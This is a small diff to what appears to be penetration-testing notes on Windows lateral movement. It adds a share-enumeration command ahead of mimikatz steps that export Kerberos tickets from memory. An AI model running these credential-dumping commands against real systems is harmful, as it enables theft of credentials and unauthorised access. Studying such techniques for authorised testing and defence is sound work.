@@ -118,7 +118,8 @@ Goal:
 
 ```
 PS > whoami # user1
-PS > ls \\host2\someshare # access denied
+PS > net view \\host2 /all # list all the shares on the remote host2
+PS > ls \\host2\someshare # access denied to a particular share 'someshare'
 PS > c:\path\to\mimikatz
 mimikatz # privilege::debug
 mimikatz # sekurlsa::tickets /export
